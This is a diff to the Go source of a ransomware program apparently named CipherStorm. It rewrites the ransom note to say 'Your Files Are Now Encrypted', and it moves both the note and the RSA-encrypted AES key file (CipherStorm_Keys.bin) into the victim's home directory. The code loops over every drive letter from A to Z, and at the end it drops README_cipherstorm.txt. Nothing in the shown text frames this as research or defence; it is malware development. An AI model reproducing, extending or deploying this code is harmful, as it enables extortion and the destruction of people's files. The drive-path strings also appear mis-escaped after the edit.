@@ -11,6 +11,7 @@ import (
 	"io"
 	"io/fs"
 	"os"
+	"os/user"
 	"path/filepath"
 	"slices"
 	"strings"
@@ -41,6 +42,35 @@ FgqoacrqCb2V6/cE1cH8uu4DcNFM9/ehvT1CqRmBnpP/qOW4xVAoLzbxVzj9si39
 St6kW8kUefnfYuFgWq92TOMCAwEAAQ==
 -----END PUBLIC KEY-----`
 
+const _ransom = `ALERT: Your Files Are Now Encrypted!
+
+Warning!
+
+All files on your PC have been "encrypted" by CipherStorm encryption algorithm. Here's what's really going on:
+
+1.  All your important files (well, they were encrypted ) are "locked" by a AES key.
+2.  You'll notice that the "decryption key" is stored in a file called CipherStorm_Keys.bin.
+3.  Deleting this file permenantly encrypts all files.
+`
+
+func ransom(file_name string) error {
+	currentUser, _ := user.Current()
+	homeDir := currentUser.HomeDir
+
+	file_path := filepath.Join(homeDir, file_name)
+	file, err := os.Create(file_path)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	_, err = file.WriteString(_ransom)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
 func rsa_encode(aes_key []byte) error {
 	block, _ := pem.Decode([]byte(public_Key))
 	if block == nil || block.Type != "PUBLIC KEY" {
@@ -67,7 +97,10 @@ func rsa_encode(aes_key []byte) error {
 		return err
 	}
 	//creating file
-	file := "CipherStorm_Keys.txt"
+	currentUser, _ := user.Current()
+	homeDir := currentUser.HomeDir
+
+	file := filepath.Join(homeDir, "CipherStorm_Keys.bin")
 	password, err := os.Create(file)
 	if err != nil {
 		return err
@@ -144,29 +177,11 @@ func traverse(drive string) error {
 	return nil
 }
 
-func ransom(file_name string) error {
-	_f, err := os.Create(file_name)
-	if err != nil {
-		return err
-	}
-	defer _f.Close()
-	_ransom := `
-	This is a ransomeware that crypts all the data in YOUR pc.
-    All the files are crypted using a AES key and saved in the file named CipherStorm_Keys.txt .
-    Deleting that file permanently crypts all your files. So i wouldn't recommend doing that.
-	`
-	err = os.WriteFile(file_name, []byte(_ransom), 0777)
-	if err != nil {
-		return err
-	}
-	return nil
-}
-
 func main() {
 
-	drives := []string{"A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\",
-		"I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\",
-		"S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\",
+	drives := []string{"A:\\\\", "B:\\\\", "C:\\\\", "D:\\\\", "E:\\\\", "F:\\\\", "G:\\\\", "H:\\\\",
+		"I:\\\\", "J:\\\\", "K:\\\\", "L:\\\\", "M:\\\\", "N:\\\\", "O:\\\\", "P:\\\\", "Q:\\\\", "R:\\\\",
+		"S:\\\\", "T:\\\\", "U:\\\\", "V:\\\\", "W:\\\\", "X:\\\\", "Y:\\\\", "Z:\\\\",
 	}
 
 	for _, drive := range drives {
@@ -201,5 +216,5 @@ func main() {
 		<-done
 	}
 
-	ransom("Cipher-Storm.txt")
+	ransom("README_cipherstorm.txt")
 }
